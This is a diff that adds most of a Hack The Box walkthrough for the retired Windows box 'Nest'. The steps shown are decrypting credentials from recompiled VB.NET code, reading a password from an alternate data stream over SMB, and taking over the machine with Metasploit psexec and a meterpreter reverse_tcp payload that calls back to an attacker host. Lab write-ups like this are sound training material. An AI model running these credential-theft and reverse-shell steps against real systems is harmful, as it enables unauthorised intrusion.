@@ -4,7 +4,7 @@ title:  "HTB Nest Walkthrough"
 author: nanobyte
 date:   2020-07-30
 description: Hack The Box writeup for Nest, Retired Windows Easy Box
-tags: 
+tags: smbclient
 ---
 
 This is one of my favorite Hack the Box machines, throughout my time completing them! I absolutely enjoyed every minute of this box.
@@ -263,3 +263,191 @@ smb: \IT\Carl\> dir
 
                 10485247 blocks of size 4096. 6449951 blocks available'
 {% endhighlight %}
+
+Looking at the Utils.vb file, there are encrypting and decrypting functions. Looking at how these functions work, there is reference to symmetric key creation, using Rfc2898DeriveBytes. Instead of trying to break this encryption, I took the complete file structure, and copied to a Windows machine. Once I had it locally, I was able to compile the code using Visual Studio.
+
+Once compiled and I attempted to run the file, there was an error message:
+
+{% highlight bash linenos %}
+Unhandled Exception: System.IO.FileNotFoundException: Could not find file 'C:\Users\adalzell\Desktop\Nest\RUScanner\bin\Debug\RU_Config.xml'
+{% endhighlight %}
+
+I have the RU_config.xml file, which contains the hash string that looked like base 64! I placed that file into the directory, and when I ran it, the program ran without any exception errors. I then placed a single line of code to write to console the Plain Text in the Utils.vb decrypt function:
+
+
+{% highlight bash linenos %}
+Public Shared Function Decrypt(ByVal cipherText As String, _
+... 
+        Console.WriteLine(plainText)
+        Return plainText
+...
+{% endhighlight %}
+
+And with that, when I compiled the code again, I could see the plain text password!
+
+{% highlight bash linenos %}
+\RUScanner\bin\Debug>DbPof.exe
+xRxRxPANCAK3SxRxRx
+{% endhighlight %}
+
+And now, I am able to connect to the Users share and own user:
+
+{% highlight bash linenos %}
+smbclient \\\\10.10.10.178\\Users -U C.Smith
+Enter WORKGROUP\C.Smith's password: xRxRxPANCAK3SxRxRx
+
+smb: \> cd C.Smith
+smb: \C.Smith\> ls
+  .                                   D        0  Sun Jan 26 01:21:44 2020
+  ..                                  D        0  Sun Jan 26 01:21:44 2020
+  HQK Reporting                       D        0  Thu Aug  8 18:06:17 2019
+  user.txt                            A       32  Thu Aug  8 18:05:24 2019
+
+                10485247 blocks of size 4096. 6449757 blocks available
+smb: \C.Smith\> get user.txt
+getting file \C.Smith\user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+
+
+root@hax0r:~# cat user.txt 
+xxxxxxxxxxxxxxx4fd827e05f426e987
+{% endhighlight %}
+
+Now to move on to own root. I looked in the HQK Reporting directory, and found a password file:
+
+{% highlight bash linenos %}
+smb: \C.Smith\HQK Reporting\> ls
+  .                                   D        0  Thu Aug  8 18:06:17 2019
+  ..                                  D        0  Thu Aug  8 18:06:17 2019
+  AD Integration Module               D        0  Fri Aug  9 07:18:42 2019
+  Debug Mode Password.txt             A        0  Thu Aug  8 18:08:17 2019
+  HQK_Config_Backup.xml               A      249  Thu Aug  8 18:09:05 2019
+
+                10485247 blocks of size 4096. 6449725 blocks available
+{% endhighlight %}
+
+But, it was empty. That would have been to easy! However, looking at the file attributes, there is a stream associated to it, so I copied of the Alternate Data Stream (ADS) to get the password file:
+
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 06:06:12 PM 2019 CDT
+access_time:    Thu Aug  8 06:06:12 PM 2019 CDT
+write_time:     Thu Aug  8 06:08:17 PM 2019 CDT
+change_time:    Thu Aug  8 06:08:17 PM 2019 CDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+
+smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
+
+
+root@hax0r:~# cat "/root/Debug Mode Password.txt:Password" 
+WBQ201953D8w 
+{% highlight bash linenos %}
+
+And now, with this password, I can telnet into the box and enable Debug:
+
+{% highlight bash linenos %}
+telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>debug WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+{% endhighlight %}
+
+Still connected with this telnet session, I enumerated and going up one directory, in the LDAP directory, I found a config file:
+
+{% highlight bash linenos %}
+>list  
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1]   HqkLdap.exe
+[2]   Ldap.conf
+
+Current Directory: LDAP
+>showquery 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+{% endhighlight %}
+
+Using the RU_config.xml and attempting to decrypt returned a padding error. Looking further into the KqdLdap.exe, I foudn the following code in the CR function:
+
+{% highlight bash linenos %}
+' HqkLdap.CR
+' Token: 0x06000012 RID: 18 RVA: 0x00002278 File Offset: 0x00000678
+Public Shared Function DS(EncryptedString As String) As String
+	If String.IsNullOrEmpty(EncryptedString) Then
+		Return String.Empty
+	End If
+	Return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256)
+End Function
+{% endhighlight %}
+
+This is a different set of encryption, different IV, string, and iteration. So, I placed this into the Decryption function of DbPof.exe, and with the administrator hash in the RU_config.xml file, I reran the DbProf.exe program from command prompt, and got the administrator password!
+
+{% highlight bash linenos %}
+DbPof.exe
+XtH4nkS4Pl4y1nGX
+{% endhighlight %}
+
+I connected to SMB Share, but there was a shortcut link to the admins desktop. So, I used metasploit (after multiple failed attempts with evil-winrm, impacket psexec.py, and winexec) psexec with reverse_tcp payload:
+
+{% highlight bash linenos %}
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp        
+
+msf5 exploit(windows/smb/psexec) > set LHOST 10.10.14.13
+LHOST => 10.10.14.13
+msf5 exploit(windows/smb/psexec) > set LPORT 4538
+LPORT => 4538
+msf5 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.178
+RHOSTS => 10.10.10.178
+msf5 exploit(windows/smb/psexec) > set SMBUser
+SMBUser => 
+msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
+SMBUser => Administrator
+msf5 exploit(windows/smb/psexec) > set SMBPass XtH4nkS4Pl4y1nGX
+SMBPass => XtH4nkS4Pl4y1nGX
+
+msf5 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.13:4538 
+[*] 10.10.10.178:445 - Connecting to the server...
+[*] 10.10.10.178:445 - Authenticating to 10.10.10.178:445 as user 'Administrator'...
+[*] 10.10.10.178:445 - Selecting PowerShell target
+[*] 10.10.10.178:445 - Executing the payload...
+[+] 10.10.10.178:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (180291 bytes) to 10.10.10.178
+[*] Meterpreter session 1 opened (10.10.14.13:4538 -> 10.10.10.178:49157) at 2020-01-29 14:28:29 -0600
+
+meterpreter > shell
+Process 1456 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd C:\users\administrator\desktop
+cd C:\users\administrator\desktop
+
+C:\Users\Administrator\Desktop>more root.txt
+more root.txt
+xxxxxxxxxxxxxxxxxxx08a42f0b94b878c41
+{% endhighlight %}
+
+And rooted this box! The name, Nest, really fits this complex set of steps, nesting each step to proceed. Thanks for reading!
